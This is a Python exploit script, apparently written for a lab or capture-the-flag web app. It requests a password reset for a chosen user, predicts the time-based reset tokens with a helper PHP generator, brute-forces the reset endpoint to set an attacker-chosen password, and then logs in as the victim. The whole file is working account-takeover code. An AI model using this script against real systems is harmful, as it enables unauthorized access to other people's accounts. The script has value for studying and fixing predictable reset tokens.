import sys, requests, time, subprocess, argparse, re

s = requests.session()
proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "https://127.0.0.1:8080",
}

def timestamp():
    return round(time.time() * 1000)

def generateToken(ip, user):
    t1 = timestamp()
    time.sleep(3)
    tokenRequest(ip, user)
    t2 = timestamp()
    cmd = "php generatetoken.php %d %d" % (t1, t2)
    gen = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
    tokens = gen.stdout.read().decode("UTF-8").split("\n")[:-1]
    num = "\n[+] Generated %s tokens." % len(tokens)
    print(num)
    return tokens

def tokenRequest(ip, user):
    target = "http://%s/forgotpassword.php" % ip
    data = {'username': user}
    req = s.post(target, data=data)
    res = req.text
    if "Email sent!" in res:
        print("\n[+] Password recovery requested.")

def passwordReset(ip, passwd, tokens):
    target = "http://%s/resetpassword.php" % ip
    for token in tokens:
        print(f"\r[+] Trying: {token}",end="")
        sys.stdout.flush()
        data = {'token': token,
                'password1': passwd,
                'password2': passwd}
        req = s.post(target, data)
        res = req.text
        if "Password changed!" in res:
            print("\n\n[+] Password successfully changed to",passwd)
            return passwd

def authenticate(ip, user, password):
    target = "http://%s/login.php" % ip
    data = {'username': user,
            'password': password}
    req = s.post(target, data=data, allow_redirects=True)
    res = req.text
    usermatch = re.search(r'<div class="center_div">(.*?)<br>', res)
    if usermatch:
        output = usermatch.group(1)
        print(output)
    else:
        print("\n[!] Failed to authenticate.")
        sys.exit(-1)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', help='Target IP address', required=True)
    parser.add_argument('--user', help='Target username', required=True)
    parser.add_argument('--password', help='Desired password to be defined', required=True)
    args = parser.parse_args()
    ip = args.ip
    user = args.user
    passwd = args.password

    tokens = generateToken(ip, user)
    newpass = passwordReset(ip, passwd, tokens)
    authenticate(ip, user, newpass)

if __name__ == "__main__":
	main()
